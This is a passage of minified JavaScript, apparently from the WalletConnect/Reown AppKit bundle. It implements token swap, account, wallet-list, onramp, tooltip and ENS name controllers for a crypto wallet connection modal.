s=!Ie.toToken?.address||!Ie.toToken?.decimals,o=!Ie.sourceToken?.address||!Ie.sourceToken?.decimals||!Tr.bigNumber(Ie.sourceTokenAmount).gt(0),a=!Ie.sourceTokenAmount;return{networkAddress:i,fromAddress:t,fromCaipAddress:r,sourceTokenAddress:Ie.sourceToken?.address,toTokenAddress:Ie.toToken?.address,toTokenAmount:Ie.toTokenAmount,toTokenDecimals:Ie.toToken?.decimals,sourceTokenAmount:Ie.sourceTokenAmount,sourceTokenDecimals:Ie.sourceToken?.decimals,invalidToToken:s,invalidSourceToken:o,invalidSourceTokenAmount:a,availableToSwap:r&&!s&&!o&&!a,isAuthConnector:n===Me.CONNECTOR_ID.AUTH}},setSourceToken(r){if(!r){Ie.sourceToken=r,Ie.sourceTokenAmount="",Ie.sourceTokenPriceInUSD=0;return}Ie.sourceToken=r,this.setTokenPrice(r.address,"sourceToken")},setSourceTokenAmount(r){Ie.sourceTokenAmount=r},setToToken(r){if(!r){Ie.toToken=r,Ie.toTokenAmount="",Ie.toTokenPriceInUSD=0;return}Ie.toToken=r,this.setTokenPrice(r.address,"toToken")},setToTokenAmount(r){Ie.toTokenAmount=r?Tr.formatNumberToLocalString(r,$ke):""},async setTokenPrice(r,e){let t=Ie.tokensPriceMap[r]||0;t||(Ie.loadingPrices=!0,t=await this.getAddressPrice(r)),e==="sourceToken"?Ie.sourceTokenPriceInUSD=t:e==="toToken"&&(Ie.toTokenPriceInUSD=t),Ie.loadingPrices&&(Ie.loadingPrices=!1),this.getParams().availableToSwap&&this.swapTokens()},switchTokens(){if(Ie.initializing||!Ie.initialized)return;const r=Ie.toToken?{...Ie.toToken}:void 0,e=Ie.sourceToken?{...Ie.sourceToken}:void 0,t=r&&Ie.toTokenAmount===""?"1":Ie.toTokenAmount;this.setSourceToken(r),this.setToToken(e),this.setSourceTokenAmount(t),this.setToTokenAmount(""),this.swapTokens()},resetState(){Ie.myTokensWithBalance=pa.myTokensWithBalance,Ie.tokensPriceMap=pa.tokensPriceMap,Ie.initialized=pa.initialized,Ie.sourceToken=pa.sourceToken,Ie.sourceTokenAmount=pa.sourceTokenAmount,Ie.sourceTokenPriceInUSD=pa.sourceTokenPriceInUSD,Ie.toToken=pa.toToken,Ie.toTokenAmount=pa.toTokenAmount,Ie.toTokenPriceInUSD=pa.toTokenPriceInUSD,Ie.networkPrice=pa.networkPrice,Ie.networkTokenSymbol=pa.networkTokenSymbol,Ie.networkBalanceInUSD=pa.networkBalanceInUSD,Ie.inputError=pa.inputError},resetValues(){const{networkAddress:r}=this.getParams(),e=Ie.tokens?.find(t=>t.address===r);this.setSourceToken(e),this.setToToken(void 0)},getApprovalLoadingState(){return Ie.loadingApprovalTransaction},clearError(){Ie.transactionError=void 0},async initializeState(){if(!Ie.initializing){if(Ie.initializing=!0,!Ie.initialized)try{await this.fetchTokens(),Ie.initialized=!0}catch{Ie.initialized=!1,vt.showError("Failed to initialize swap"),Ee.goBack()}Ie.initializing=!1}},async fetchTokens(){const{networkAddress:r}=this.getParams();await this.getTokenList(),await this.getNetworkTokenPrice(),await this.getMyTokensWithBalance();const e=Ie.tokens?.find(t=>t.address===r);e&&(Ie.networkTokenSymbol=e.symbol,this.setSourceToken(e),this.setSourceTokenAmount("1"))},async getTokenList(){const r=await s5.getTokenList();Ie.tokens=r,Ie.popularTokens=r.sort((e,t)=>e.symbol<t.symbol?-1:e.symbol>t.symbol?1:0),Ie.suggestedTokens=r.filter(e=>!!kr.SWAP_SUGGESTED_TOKENS.includes(e.symbol),{})},async getAddressPrice(r){const e=Ie.tokensPriceMap[r];if(e)return e;const i=(await Lt.fetchTokenPrice({addresses:[r]}))?.fungibles||[],s=[...Ie.tokens||[],...Ie.myTokensWithBalance||[]]?.find(c=>c.address===r)?.symbol,o=i.find(c=>c.symbol.toLowerCase()===s?.toLowerCase())?.price||0,a=parseFloat(o.toString());return Ie.tokensPriceMap[r]=a,a},async getNetworkTokenPrice(){const{networkAddress:r}=this.getParams(),t=(await Lt.fetchTokenPrice({addresses:[r]}).catch(()=>(vt.showError("Failed to fetch network token price"),{fungibles:[]}))).fungibles?.[0],i=t?.price.toString()||"0";Ie.tokensPriceMap[r]=parseFloat(i),Ie.networkTokenSymbol=t?.symbol||"",Ie.networkPrice=i},async getMyTokensWithBalance(r){const e=await s5.getMyTokensWithBalance(r);e&&(await this.getInitialGasPrice(),this.setBalances(e))},setBalances(r){const{networkAddress:e}=this.getParams(),t=re.state.activeCaipNetwork;if(!t)return;const i=r.find(n=>n.address===e);r.forEach(n=>{Ie.tokensPriceMap[n.address]=n.price||0}),Ie.myTokensWithBalance=r.filter(n=>n.address.startsWith(t.caipNetworkId)),Ie.networkBalanceInUSD=i?Tr.multiply(i.quantity.numeric,i.price).toString():"0"},async getInitialGasPrice(){const r=await s5.fetchGasPrice();if(!r)return{gasPrice:null,gasPriceInUSD:null};switch(re.state?.activeCaipNetwork?.chainNamespace){case"solana":return Ie.gasFee=r.standard??"0",Ie.gasPriceInUSD=Tr.multiply(r.standard,Ie.networkPrice).div(1e9).toNumber(),{gasPrice:BigInt(Ie.gasFee),gasPriceInUSD:Number(Ie.gasPriceInUSD)};case"eip155":default:const e=r.standard??"0",t=BigInt(e),i=BigInt(qF),n=Ph.getGasPriceInUSD(Ie.networkPrice,i,t);return Ie.gasFee=e,Ie.gasPriceInUSD=n,{gasPrice:t,gasPriceInUSD:n}}},async swapTokens(){const r=Se.state.address,e=Ie.sourceToken,t=Ie.toToken,i=Tr.bigNumber(Ie.sourceTokenAmount).gt(0);if(i||this.setToTokenAmount(""),!t||!e||Ie.loadingPrices||!i)return;Ie.loadingQuote=!0;const n=Tr.bigNumber(Ie.sourceTokenAmount).times(10**e.decimals).round(0);try{const s=await Lt.fetchSwapQuote({userAddress:r,from:e.address,to:t.address,gasPrice:Ie.gasFee,amount:n.toString()});Ie.loadingQuote=!1;const o=s?.quotes?.[0]?.toAmount;if(!o){md.open({shortMessage:"Incorrect amount",longMessage:"Please enter a valid amount"},"error");return}const a=Tr.bigNumber(o).div(10**t.decimals).toString();this.setToTokenAmount(a),this.hasInsufficientToken(Ie.sourceTokenAmount,e.address)?Ie.inputError="Insufficient balance":(Ie.inputError=void 0,this.setTransactionDetails())}catch{Ie.loadingQuote=!1,Ie.inputError="Insufficient balance"}},async getTransaction(){const{fromCaipAddress:r,availableToSwap:e}=this.getParams(),t=Ie.sourceToken,i=Ie.toToken;if(!(!r||!e||!t||!i||Ie.loadingQuote))try{Ie.loadingBuildTransaction=!0;const n=await s5.fetchSwapAllowance({userAddress:r,tokenAddress:t.address,sourceTokenAmount:Ie.sourceTokenAmount,sourceTokenDecimals:t.decimals});let s;return n?s=await this.createSwapTransaction():s=await this.createAllowanceTransaction(),Ie.loadingBuildTransaction=!1,Ie.fetchError=!1,s}catch{Ee.goBack(),vt.showError("Failed to check allowance"),Ie.loadingBuildTransaction=!1,Ie.approvalTransaction=void 0,Ie.swapTransaction=void 0,Ie.fetchError=!0;return}},async createAllowanceTransaction(){const{fromCaipAddress:r,fromAddress:e,sourceTokenAddress:t,toTokenAddress:i}=this.getParams();if(!(!r||!i)){if(!t)throw new Error("createAllowanceTransaction - No source token address found.");try{const n=await Lt.generateApproveCalldata({from:t,to:i,userAddress:r}),s=await ft.estimateGas({address:e,to:ke.getPlainAddress(n.tx.to),data:n.tx.data}),o={data:n.tx.data,to:ke.getPlainAddress(n.tx.from),gas:s,gasPrice:BigInt(n.tx.eip155.gasPrice),value:BigInt(n.tx.value),toAmount:Ie.toTokenAmount};return Ie.swapTransaction=void 0,Ie.approvalTransaction={data:o.data,to:o.to,gas:o.gas??BigInt(0),gasPrice:o.gasPrice,value:o.value,toAmount:o.toAmount},{data:o.data,to:o.to,gas:o.gas??BigInt(0),gasPrice:o.gasPrice,value:o.value,toAmount:o.toAmount}}catch{Ee.goBack(),vt.showError("Failed to create approval transaction"),Ie.approvalTransaction=void 0,Ie.swapTransaction=void 0,Ie.fetchError=!0;return}}},async createSwapTransaction(){const{networkAddress:r,fromCaipAddress:e,sourceTokenAmount:t}=this.getParams(),i=Ie.sourceToken,n=Ie.toToken;if(!e||!t||!i||!n)return;const s=ft.parseUnits(t,i.decimals)?.toString();try{const o=await Lt.generateSwapCalldata({userAddress:e,from:i.address,to:n.address,amount:s}),a=i.address===r,c=BigInt(o.tx.eip155.gas),l=BigInt(o.tx.eip155.gasPrice),u={data:o.tx.data,to:ke.getPlainAddress(o.tx.to),gas:c,gasPrice:l,value:BigInt(a?s??"0":"0"),toAmount:Ie.toTokenAmount};return Ie.gasPriceInUSD=Ph.getGasPriceInUSD(Ie.networkPrice,c,l),Ie.approvalTransaction=void 0,Ie.swapTransaction=u,u}catch{Ee.goBack(),vt.showError("Failed to create transaction"),Ie.approvalTransaction=void 0,Ie.swapTransaction=void 0,Ie.fetchError=!0;return}},async sendTransactionForApproval(r){const{fromAddress:e,isAuthConnector:t}=this.getParams();Ie.loadingApprovalTransaction=!0;const i="Approve limit increase in your wallet";t?Ee.pushTransactionStack({view:null,goBack:!0,onSuccess(){vt.showLoading(i)}}):vt.showLoading(i);try{await ft.sendTransaction({address:e,to:r.to,data:r.data,gas:r.gas,gasPrice:BigInt(r.gasPrice),value:r.value,chainNamespace:"eip155"}),await this.swapTokens(),await this.getTransaction(),Ie.approvalTransaction=void 0,Ie.loadingApprovalTransaction=!1}catch(n){const s=n;Ie.transactionError=s?.shortMessage,Ie.loadingApprovalTransaction=!1,vt.showError(s?.shortMessage||"Transaction error"),Ve.sendEvent({type:"track",event:"SWAP_APPROVAL_ERROR",properties:{message:s?.shortMessage||s?.message||"Unknown",network:re.state.activeCaipNetwork?.caipNetworkId||"",swapFromToken:this.state.sourceToken?.symbol||"",swapToToken:this.state.toToken?.symbol||"",swapFromAmount:this.state.sourceTokenAmount||"",swapToAmount:this.state.toTokenAmount||"",isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT}})}},async sendTransactionForSwap(r){if(!r)return;const{fromAddress:e,toTokenAmount:t,isAuthConnector:i}=this.getParams();Ie.loadingTransaction=!0;const n=`Swapping ${Ie.sourceToken?.symbol} to ${Tr.formatNumberToLocalString(t,3)} ${Ie.toToken?.symbol}`,s=`Swapped ${Ie.sourceToken?.symbol} to ${Tr.formatNumberToLocalString(t,3)} ${Ie.toToken?.symbol}`;i?Ee.pushTransactionStack({view:"Account",goBack:!1,onSuccess(){vt.showLoading(n),dt.resetState()}}):vt.showLoading("Confirm transaction in your wallet");try{const o=[Ie.sourceToken?.address,Ie.toToken?.address].join(","),a=await ft.sendTransaction({address:e,to:r.to,data:r.data,gas:r.gas,gasPrice:BigInt(r.gasPrice),value:r.value,chainNamespace:"eip155"});return Ie.loadingTransaction=!1,vt.showSuccess(s),Ve.sendEvent({type:"track",event:"SWAP_SUCCESS",properties:{network:re.state.activeCaipNetwork?.caipNetworkId||"",swapFromToken:this.state.sourceToken?.symbol||"",swapToToken:this.state.toToken?.symbol||"",swapFromAmount:this.state.sourceTokenAmount||"",swapToAmount:this.state.toTokenAmount||"",isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT}}),dt.resetState(),i||Ee.replace("Account"),dt.getMyTokensWithBalance(o),a}catch(o){const a=o;Ie.transactionError=a?.shortMessage,Ie.loadingTransaction=!1,vt.showError(a?.shortMessage||"Transaction error"),Ve.sendEvent({type:"track",event:"SWAP_ERROR",properties:{message:a?.shortMessage||a?.message||"Unknown",network:re.state.activeCaipNetwork?.caipNetworkId||"",swapFromToken:this.state.sourceToken?.symbol||"",swapToToken:this.state.toToken?.symbol||"",swapFromAmount:this.state.sourceTokenAmount||"",swapToAmount:this.state.toTokenAmount||"",isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT}});return}},hasInsufficientToken(r,e){const t=Ph.isInsufficientSourceTokenForSwap(r,e,Ie.myTokensWithBalance);let i=!0;return Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT?i=!1:i=Ph.isInsufficientNetworkTokenForGas(Ie.networkBalanceInUSD,Ie.gasPriceInUSD),i||t},setTransactionDetails(){const{toTokenAddress:r,toTokenDecimals:e}=this.getParams();!r||!e||(Ie.gasPriceInUSD=Ph.getGasPriceInUSD(Ie.networkPrice,BigInt(Ie.gasFee),BigInt(qF)),Ie.priceImpact=Ph.getPriceImpact({sourceTokenAmount:Ie.sourceTokenAmount,sourceTokenPriceInUSD:Ie.sourceTokenPriceInUSD,toTokenPriceInUSD:Ie.toTokenPriceInUSD,toTokenAmount:Ie.toTokenAmount}),Ie.maxSlippage=Ph.getMaxSlippage(Ie.slippage,Ie.toTokenAmount),Ie.providerFee=Ph.getProviderFee(Ie.sourceTokenAmount))}},Fu=sr({currentTab:0,tokenBalance:[],smartAccountDeployed:!1,addressLabels:new Map,allAccounts:[]}),Se={state:Fu,replaceState(r){r&&Object.assign(Fu,Ra(r))},subscribe(r){return re.subscribeChainProp("accountState",e=>{if(e)return r(e)})},subscribeKey(r,e,t){let i;return re.subscribeChainProp("accountState",n=>{if(n){const s=n[r];i!==s&&(i=s,e(s))}},t)},setStatus(r,e){re.setAccountProp("status",r,e)},getCaipAddress(r){return re.getAccountProp("caipAddress",r)},setCaipAddress(r,e){const t=r?ke.getPlainAddress(r):void 0;e===re.state.activeChain&&(re.state.activeCaipAddress=r),re.setAccountProp("caipAddress",r,e),re.setAccountProp("address",t,e)},setBalance(r,e,t){re.setAccountProp("balance",r,t),re.setAccountProp("balanceSymbol",e,t)},setProfileName(r,e){re.setAccountProp("profileName",r,e)},setProfileImage(r,e){re.setAccountProp("profileImage",r,e)},setUser(r,e){re.setAccountProp("user",r,e)},setAddressExplorerUrl(r,e){re.setAccountProp("addressExplorerUrl",r,e)},setSmartAccountDeployed(r,e){re.setAccountProp("smartAccountDeployed",r,e)},setCurrentTab(r){re.setAccountProp("currentTab",r,re.state.activeChain)},setTokenBalance(r,e){r&&re.setAccountProp("tokenBalance",r,e)},setShouldUpdateToAddress(r,e){re.setAccountProp("shouldUpdateToAddress",r,e)},setAllAccounts(r,e){re.setAccountProp("allAccounts",r,e)},addAddressLabel(r,e,t){const i=re.getAccountProp("addressLabels",t)||new Map;i.set(r,e),re.setAccountProp("addressLabels",i,t)},removeAddressLabel(r,e){const t=re.getAccountProp("addressLabels",e)||new Map;t.delete(r),re.setAccountProp("addressLabels",t,e)},setConnectedWalletInfo(r,e){re.setAccountProp("connectedWalletInfo",r,e,!1)},setPreferredAccountType(r,e){re.setAccountProp("preferredAccountType",r,e)},setSocialProvider(r,e){r&&re.setAccountProp("socialProvider",r,e)},setSocialWindow(r,e){re.setAccountProp("socialWindow",r?Ra(r):void 0,e)},setFarcasterUrl(r,e){re.setAccountProp("farcasterUrl",r,e)},async fetchTokenBalance(r){Fu.balanceLoading=!0;const e=re.state.activeCaipNetwork?.caipNetworkId,t=re.state.activeCaipNetwork?.chainNamespace,i=re.state.activeCaipAddress,n=i?ke.getPlainAddress(i):void 0;if(Fu.lastRetry&&!ke.isAllowedRetry(Fu.lastRetry,30*kr.ONE_SEC_MS))return Fu.balanceLoading=!1,[];try{if(n&&e&&t){const s=await Lt.getBalance(n,e),o=s.balances.filter(a=>a.quantity.decimals!=="0");return this.setTokenBalance(o,t),dt.setBalances(s5.mapBalancesToSwapTokens(s.balances)),Fu.lastRetry=void 0,Fu.balanceLoading=!1,o}}catch(s){Fu.lastRetry=Date.now(),r?.(s),vt.showError("Token Balance Unavailable")}finally{Fu.balanceLoading=!1}return[]},resetAccount(r){re.resetAccount(r)}},Rke=ke.getApiUrl(),_o=new Xx({baseUrl:Rke,clientId:null}),Oke="40",zF="4",Bke=20,fs=sr({page:1,count:0,featured:[],recommended:[],wallets:[],search:[],isAnalyticsEnabled:!1,excludedRDNS:[]}),Ft={state:fs,subscribeKey(r,e){return ci(fs,r,e)},_getSdkProperties(){const{projectId:r,sdkType:e,sdkVersion:t}=Ne.state;return{projectId:r,st:e||"appkit",sv:t||"html-wagmi-4.2.2"}},_filterOutExtensions(r){return Ne.state.isUniversalProvider?r.filter(e=>!!(e.mobile_link||e.desktop_link||e.webapp_link)):r},async _fetchWalletImage(r){const e=`${_o.baseUrl}/getWalletImage/${r}`,t=await _o.getBlob({path:e,params:Ft._getSdkProperties()});Li.setWalletImage(r,URL.createObjectURL(t))},async _fetchNetworkImage(r){const e=`${_o.baseUrl}/public/getAssetImage/${r}`,t=await _o.getBlob({path:e,params:Ft._getSdkProperties()});Li.setNetworkImage(r,URL.createObjectURL(t))},async _fetchConnectorImage(r){const e=`${_o.baseUrl}/public/getAssetImage/${r}`,t=await _o.getBlob({path:e,params:Ft._getSdkProperties()});Li.setConnectorImage(r,URL.createObjectURL(t))},async _fetchCurrencyImage(r){const e=`${_o.baseUrl}/public/getCurrencyImage/${r}`,t=await _o.getBlob({path:e,params:Ft._getSdkProperties()});Li.setCurrencyImage(r,URL.createObjectURL(t))},async _fetchTokenImage(r){const e=`${_o.baseUrl}/public/getTokenImage/${r}`,t=await _o.getBlob({path:e,params:Ft._getSdkProperties()});Li.setTokenImage(r,URL.createObjectURL(t))},async prefetchNetworkImages(){const e=re.getAllRequestedCaipNetworks()?.map(({assets:t})=>t?.imageId).filter(Boolean).filter(t=>!Nr.getNetworkImageById(t));e&&await Promise.allSettled(e.map(t=>Ft._fetchNetworkImage(t)))},async fetchConnectorImages(){const{connectors:r}=Xe.state,e=r.map(({imageId:t})=>t).filter(Boolean);await Promise.allSettled(e.map(t=>Ft._fetchConnectorImage(t)))},async fetchCurrencyImages(r=[]){await Promise.allSettled(r.map(e=>Ft._fetchCurrencyImage(e)))},async fetchTokenImages(r=[]){await Promise.allSettled(r.map(e=>Ft._fetchTokenImage(e)))},async fetchFeaturedWallets(){const{featuredWalletIds:r}=Ne.state;if(r?.length){const{data:e}=await _o.get({path:"/getWallets",params:{...Ft._getSdkProperties(),page:"1",entries:r?.length?String(r.length):zF,include:r?.join(",")}});e.sort((i,n)=>r.indexOf(i.id)-r.indexOf(n.id));const t=e.map(i=>i.image_id).filter(Boolean);await Promise.allSettled(t.map(i=>Ft._fetchWalletImage(i))),fs.featured=e}},async fetchRecommendedWallets(){try{const{includeWalletIds:r,excludeWalletIds:e,featuredWalletIds:t}=Ne.state,i=[...e??[],...t??[]].filter(Boolean),{data:n,count:s}=await _o.get({path:"/getWallets",params:{...Ft._getSdkProperties(),page:"1",chains:re.state.activeCaipNetwork?.caipNetworkId,entries:zF,include:r?.join(","),exclude:i?.join(",")}}),o=He.getRecentWallets(),a=n.map(l=>l.image_id).filter(Boolean),c=o.map(l=>l.image_id).filter(Boolean);await Promise.allSettled([...a,...c].map(l=>Ft._fetchWalletImage(l))),fs.recommended=n,fs.count=s??0}catch{}},async fetchWallets({page:r}){const{includeWalletIds:e,excludeWalletIds:t,featuredWalletIds:i}=Ne.state,n=[...fs.recommended.map(({id:c})=>c),...t??[],...i??[]].filter(Boolean),{data:s,count:o}=await _o.get({path:"/getWallets",params:{...Ft._getSdkProperties(),page:String(r),entries:Oke,chains:re.state.activeCaipNetwork?.caipNetworkId,include:e?.join(","),exclude:n.join(",")}}),a=s.slice(0,Bke).map(c=>c.image_id).filter(Boolean);await Promise.allSettled(a.map(c=>Ft._fetchWalletImage(c))),fs.wallets=ke.uniqueBy([...fs.wallets,...Ft._filterOutExtensions(s)],"id"),fs.count=o>fs.count?o:fs.count,fs.page=r},async initializeExcludedWalletRdns({ids:r}){const{data:e}=await _o.get({path:"/getWallets",params:{...Ft._getSdkProperties(),page:"1",entries:String(r.length),chains:re.state.activeCaipNetwork?.caipNetworkId,include:r?.join(",")}});e&&e.forEach(t=>{t?.rdns&&fs.excludedRDNS.push(t.rdns)})},async searchWallet({search:r,badge:e}){const{includeWalletIds:t,excludeWalletIds:i}=Ne.state;fs.search=[];const{data:n}=await _o.get({path:"/getWallets",params:{...Ft._getSdkProperties(),page:"1",entries:"100",search:r?.trim(),badge_type:e,chains:re.state.activeCaipNetwork?.caipNetworkId,include:t?.join(","),exclude:i?.join(",")}});Ve.sendEvent({type:"track",event:"SEARCH_WALLET",properties:{badge:e??"",search:r??""}});const s=n.map(o=>o.image_id).filter(Boolean);await Promise.allSettled([...s.map(o=>Ft._fetchWalletImage(o)),ke.wait(300)]),fs.search=Ft._filterOutExtensions(n)},prefetch(){if(Se.state.status==="connected")return Promise.resolve();if(fs.prefetchPromise)return fs.prefetchPromise;const r=[Ft.fetchFeaturedWallets(),Ft.fetchRecommendedWallets(),Ft.fetchConnectorImages(),Ft.prefetchNetworkImages()];return fs.prefetchPromise=Promise.allSettled(r),fs.prefetchPromise},prefetchAnalyticsConfig(){Ne.state.features?.analytics&&Ft.fetchAnalyticsConfig()},async fetchAnalyticsConfig(){const{isAnalyticsEnabled:r}=await _o.get({path:"/getAnalyticsConfig",params:Ft._getSdkProperties()});Ne.setFeatures({analytics:r})}},qu=sr({loading:!1,open:!1,shake:!1}),Ut={state:qu,subscribe(r){return ai(qu,()=>r(qu))},subscribeKey(r,e){return ci(qu,r,e)},async open(r){await Ft.prefetch();const e=re.state.activeCaipAddress,t=re.state.noAdapters;r?.view?Ee.reset(r.view):e?Ee.reset("Account"):t&&!ke.isMobile()?Ee.reset("ConnectingWalletConnectBasic"):Ee.reset("Connect"),qu.open=!0,t0.set({open:!0}),Ve.sendEvent({type:"track",event:"MODAL_OPEN",properties:{connected:!!e}})},close(){const r=Ne.state.enableEmbedded,e=!!re.state.activeCaipAddress;qu.open=!1,r?e?Ee.replace("Account"):Ee.push("Connect"):t0.set({open:!1}),Ve.sendEvent({type:"track",event:"MODAL_CLOSE",properties:{connected:e}}),Xe.clearNamespaceFilter()},setLoading(r){qu.loading=r,t0.set({loading:r})},shake(){qu.shake||(qu.shake=!0,setTimeout(()=>{qu.shake=!1},500))}},I5={id:"2b92315d-eab7-5bef-84fa-089a131333f5",name:"USD Coin",symbol:"USDC",networks:[{name:"ethereum-mainnet",display_name:"Ethereum",chain_id:"1",contract_address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},{name:"polygon-mainnet",display_name:"Polygon",chain_id:"137",contract_address:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"}]},Uk={id:"USD",payment_method_limits:[{id:"card",min:"10.00",max:"7500.00"},{id:"ach_bank_account",min:"10.00",max:"25000.00"}]},Mke={providers:kJ,selectedProvider:null,error:null,purchaseCurrency:I5,paymentCurrency:Uk,purchaseCurrencies:[I5],paymentCurrencies:[],quotesLoading:!1},_i=sr(Mke),Ai={state:_i,subscribe(r){return ai(_i,()=>r(_i))},subscribeKey(r,e){return ci(_i,r,e)},setSelectedProvider(r){if(r&&r.name==="meld"){const e=re.state.activeChain===Me.CHAIN.SOLANA?"SOL":"USDC",t=Se.state.address??"",i=new URL(r.url);i.searchParams.append("publicKey",A1e),i.searchParams.append("destinationCurrencyCode",e),i.searchParams.append("walletAddress",t),r.url=i.toString()}_i.selectedProvider=r},setPurchaseCurrency(r){_i.purchaseCurrency=r},setPaymentCurrency(r){_i.paymentCurrency=r},setPurchaseAmount(r){this.state.purchaseAmount=r},setPaymentAmount(r){this.state.paymentAmount=r},async getAvailableCurrencies(){const r=await Lt.getOnrampOptions();_i.purchaseCurrencies=r.purchaseCurrencies,_i.paymentCurrencies=r.paymentCurrencies,_i.paymentCurrency=r.paymentCurrencies[0]||Uk,_i.purchaseCurrency=r.purchaseCurrencies[0]||I5,await Ft.fetchCurrencyImages(r.paymentCurrencies.map(e=>e.id)),await Ft.fetchTokenImages(r.purchaseCurrencies.map(e=>e.symbol))},async getQuote(){_i.quotesLoading=!0;try{const r=await Lt.getOnrampQuote({purchaseCurrency:_i.purchaseCurrency,paymentCurrency:_i.paymentCurrency,amount:_i.paymentAmount?.toString()||"0",network:_i.purchaseCurrency?.symbol});return _i.quotesLoading=!1,_i.purchaseAmount=Number(r?.purchaseAmount.amount),r}catch(r){return _i.error=r.message,_i.quotesLoading=!1,null}finally{_i.quotesLoading=!1}},resetState(){_i.providers=kJ,_i.selectedProvider=null,_i.error=null,_i.purchaseCurrency=I5,_i.paymentCurrency=Uk,_i.purchaseCurrencies=[I5],_i.paymentCurrencies=[],_i.paymentAmount=void 0,_i.purchaseAmount=void 0,_i.quotesLoading=!1}},ql=sr({message:"",open:!1,triggerRect:{width:0,height:0,top:0,left:0},variant:"shade"}),oc={state:ql,subscribe(r){return ai(ql,()=>r(ql))},subscribeKey(r,e){return ci(ql,r,e)},showTooltip({message:r,triggerRect:e,variant:t}){ql.open=!0,ql.message=r,ql.triggerRect=e,ql.variant=t},hide(){ql.open=!1,ql.message="",ql.triggerRect={width:0,height:0,top:0,left:0}}},WF=2147483648,Dke={convertEVMChainIdToCoinType(r){if(r>=WF)throw new Error("Invalid chainId");return(WF|r)>>>0}},Bc=sr({suggestions:[],loading:!1}),id={state:Bc,subscribe(r){return ai(Bc,()=>r(Bc))},subscribeKey(r,e){return ci(Bc,r,e)},async resolveName(r){try{return await Lt.lookupEnsName(r)}catch(e){const t=e;throw new Error(t?.reasons?.[0]?.description||"Error resolving name")}},async isNameRegistered(r){try{return await Lt.lookupEnsName(r),!0}catch{return!1}},async getSuggestions(r){try{Bc.loading=!0,Bc.suggestions=[];const e=await Lt.getEnsNameSuggestions(r);return Bc.suggestions=e.suggestions.map(t=>({...t,name:t.name}))||[],Bc.suggestions}catch(e){const t=this.parseEnsApiError(e,"Error fetching name suggestions");throw new Error(t)}finally{Bc.loading=!1}},async getNamesForAddress(r){try{if(!re.state.activeCaipNetwork)return[];const t=He.getEnsFromCacheForAddress(r);if(t)return t;const i=await Lt.reverseLookupEnsName({address:r});return He.updateEnsCache({address:r,ens:i,timestamp:Date.now()}),i}catch(e){const t=this.parseEnsApiError(e,"Error fetching names for address");throw new Error(t)}},async registerName(r){const e=re.state.activeCaipNetwork;if(!e)throw new Error("Network not found");const t=Se.state.address,i=Xe.getAuthConnector();if(!t||!i)throw new Error("Address or auth connector not found");Bc.loading=!0;try{const n=JSON.stringify({name:r,attributes:{},timestamp:Math.floor(Date.now()/1e3)});Ee.pushTransactionStack({view:"RegisterAccountNameSuccess",goBack:!1,replace:!0,onCancel(){Bc.loading=!1}});const s=await ft.signMessage(n),o=e.id;if(!o)throw new Error("Network not found");const a=Dke.convertEVMChainIdToCoinType(Number(o));await Lt.registerEnsName({coinType:a,address:t,signature:s,message:n}),Se.setProfileName(r,e.chainNamespace),Ee.replace("RegisterAccountNameSuccess")}catch(n){const s=this.parseEnsApiError(n,`Error registering name ${r}`);throw Ee.replace("RegisterAccountName"),new Error(s)}finally{Bc.loading=!1}},validateName(r){return/^[a-zA-Z0-9-]{4,}$/u.test(r)},parseEnsApiError(r,e){return r?.reasons?.[0]?.description||e}};var Lke={};const wd={ACCOUNT_TABS:[{label:"Tokens"},{label:"NFTs"},{label:"Activity"}],SECURE_SITE_ORIGIN:Lke.NEXT_PUBLIC_SECURE_SITE_ORIGIN||"https://secure.walletconnect.org",VIEW_DIRECTION:{Next:"next",Prev:"prev"},DEFAULT_CONNECT_METHOD_ORDER:["email","social","wallet"],ANIMATION_DURATIONS:{HeaderText:120,ModalHeight:150,ViewTransition:150}},d0={filterOutDuplicatesByRDNS(r){const e=Ne.state.enableEIP6963?Xe.state.connectors:[],t=He.getRecentWallets(),i=e.map(a=>a.info?.rdns).filter(Boolean),n=t.map(a=>a.rdns).filter(Boolean),s=i.concat(n);if(s.includes("io.metamask.mobile")&&ke.isMobile()){const a=s.indexOf("io.metamask.mobile");s[a]="io.metamask"}return r.filter(a=>!s.includes(String(a?.rdns)))},filterOutDuplicatesByIds(r){const e=Xe.state.connectors.filter(a=>a.type==="ANNOUNCED"||a.type==="INJECTED"),t=He.getRecentWallets(),i=e.map(a=>a.explorerId),n=t.map(a=>a.id),s=i.concat(n);return r.filter(a=>!s.includes(a?.id))},filterOutDuplicateWallets(r){const e=this.filterOutDuplicatesByRDNS(r);return this.filterOutDuplicatesByIds(e)},markWalletsAsInstalled(r){const{connectors:e}=Xe.state,t=e.filter(s=>s.type==="ANNOUNCED").reduce((s,o)=>(o.info?.rdns&&(s[o.info.rdns]=!0),s),{});return r.map(s=>({...s,installed:!!s.rdns&&!!t[s.rdns??""]})).sort((s,o)=>Number(o.installed)-Number(s.installed))},getConnectOrderMethod(r,e){const t=r?.connectMethodsOrder||Ne.state.features?.connectMethodsOrder,i=e||Xe.state.connectors;if(t)return t;const{injected:n,announced:s}=u9.getConnectorsByType(i),o=n.filter(u9.showConnector),a=s.filter(u9.showConnector);return o.length||a.length?["wallet","email","social"]:wd.DEFAULT_CONNECT_METHOD_ORDER}},u9={getConnectorsByType(r){const{featured:e,recommended:t}=Ft.state,{customWallets:i}=Ne.state,n=He.getRecentWallets(),s=d0.filterOutDuplicateWallets(t),o=d0.filterOutDuplicateWallets(e),a=r.filter(d=>d.type==="MULTI_CHAIN"),c=r.filter(d=>d.type==="ANNOUNCED"),l=r.filter(d=>d.type==="INJECTED"),u=r.filter(d=>d.type==="EXTERNAL");return{custom:i,recent:n,external:u,multiChain:a,announced:c,injected:l,recommended:s,featured:o}},showConnector(r){if(r.type==="INJECTED"){if(!ke.isMobile()&&r.name==="Browser Wallet")return!1;const e=r.info?.rdns;if(!e&&!ft.checkInstalled()||e&&Ft.state.excludedRDNS&&Ft.state.excludedRDNS.includes(e))return!1}if(r.type==="ANNOUNCED"){const e=r.info?.rdns;if(e&&Ft.state.excludedRDNS.includes(e))return!1}return!0}};/**
 * @license
 * Copyright 2019 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
